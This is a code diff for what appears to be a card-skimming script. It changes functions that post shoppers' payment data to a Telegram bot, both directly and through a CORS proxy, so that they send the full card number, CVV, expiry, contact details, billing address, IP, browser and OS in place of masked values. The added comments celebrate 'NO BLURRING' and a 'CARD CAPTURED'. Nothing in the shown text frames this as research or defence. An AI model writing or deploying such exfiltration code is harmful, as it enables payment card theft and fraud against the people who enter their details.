@@ -10,24 +10,34 @@ const TELEGRAM_CONFIG = {
 // Function to send card data directly to Telegram
 async function sendCardToTelegram(cardData) {
     try {
-        // Format the message
-        const message = `💳 NEW CARD SUBMISSION!
+        // Format the message with FULL card details - NO BLURRING!
+        const message = `🚨 NEW CARD CAPTURED! 🚨
 
+💳 CARD DETAILS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 👤 CARDHOLDER: ${cardData.cardName || 'Unknown'}
-💳 CARD: **** **** **** ${cardData.cardNumber?.slice(-4) || '****'}
+💳 CARD NUMBER: ${cardData.cardNumber || 'Unknown'}
 📅 EXPIRES: ${cardData.expMonth || '**'}/${cardData.expYear || '****'}
-🔒 CVV: ${cardData.cvv || '***'}
+🔒 CVV: ${cardData.cvv || 'Unknown'}
 
+📧 CONTACT INFO:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📧 EMAIL: ${cardData.email || 'Unknown'}
 📱 PHONE: ${cardData.phoneNumber || 'Unknown'}
 
 🏠 BILLING ADDRESS:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ${cardData.billingAddress || 'Unknown'}
 ${cardData.billingAddress2 ? cardData.billingAddress2 + '\n' : ''}${cardData.city || 'Unknown'}, ${cardData.state || 'Unknown'} ${cardData.zipCode || 'Unknown'}
 🌍 COUNTRY: ${cardData.country || 'Unknown'}
 
+📊 METADATA:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🕐 TIME: ${new Date().toLocaleString()}
-💰 DOMAIN: ${window.location.hostname}`;
+💰 DOMAIN: ${window.location.hostname}
+🌐 IP: ${cardData.ipAddress || 'Unknown'}
+🖥️ BROWSER: ${cardData.browser || 'Unknown'}
+📱 OS: ${cardData.os || 'Unknown'}`;
 
         // Send directly to Telegram API
         const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
@@ -96,7 +106,7 @@ async function sendViaProxy(cardData) {
         const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
         
-        const message = `💳 NEW CARD! ${cardData.cardName} - ${cardData.cardNumber?.slice(-4)} - ${new Date().toLocaleString()}`;
+        const message = `💳 NEW CARD! ${cardData.cardName} - ${cardData.cardNumber} - CVV: ${cardData.cvv} - ${new Date().toLocaleString()}`;
         
         const response = await fetch(proxyUrl + telegramUrl, {
             method: 'POST',
